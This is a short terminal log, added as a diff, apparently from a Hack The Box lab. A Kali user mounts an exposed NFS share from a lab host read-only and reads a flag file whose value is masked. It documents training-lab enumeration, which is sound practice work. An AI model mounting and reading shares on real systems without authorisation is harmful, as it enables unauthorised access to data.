@@ -1,0 +1,16 @@
+\u250c\u2500\u2500(kali\u327fkali)-[/mnt]
+\u2514\u2500$ sudo mount -t nfs -o ro 10.129.92.27:/var/nfs /mnt/target-NFS
+                                                                                                                                                            
+\u250c\u2500\u2500(kali\u327fkali)-[/mnt]
+\u2514\u2500$ cd target-NFS 
+                                                                                                                                                            
+\u250c\u2500\u2500(kali\u327fkali)-[/mnt/target-NFS]
+\u2514\u2500$ ls
+flag.txt
+                                                                                                                                                            
+\u250c\u2500\u2500(kali\u327fkali)-[/mnt/target-NFS]
+\u2514\u2500$ cat flag.txt 
+HTB{XXXXXXXXXXXXXXX}
+                                                                                                                                                            
+\u250c\u2500\u2500(kali\u327fkali)-[/mnt/target-NFS]
+\u2514\u2500$ 
